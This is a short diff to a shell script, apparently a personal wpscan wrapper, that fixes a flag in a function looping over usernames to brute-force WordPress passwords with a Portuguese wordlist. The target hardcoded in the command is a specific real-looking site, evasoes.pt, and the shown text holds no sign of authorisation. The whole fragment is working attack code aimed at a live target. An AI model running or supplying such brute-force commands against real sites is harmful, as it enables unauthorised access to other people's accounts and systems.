@@ -40,7 +40,7 @@ function user_enumeration() {
 function force_brute () {
         for USERNAME in $USERLIST; do
         echo "Performing brute force attack for user: $USERNAME..."
-        wpscan --url https://www.evasoes.pt/  --passwords "/home/meepmaster/scripts/github/wpscanmeepscript/wordlist/portuguese_a-z_-_no_special_chars.txt" --user "$USERNAME"  --output "brute_force_result_$USERNAME.txt"
+        wpscan --url https://www.evasoes.pt/  --passwords "/home/meepmaster/scripts/github/wpscanmeepscript/wordlist/portuguese_a-z_-_no_special_chars.txt" --users "$USERNAME"  --output "brute_force_result_$USERNAME.txt"
     done
 }
 
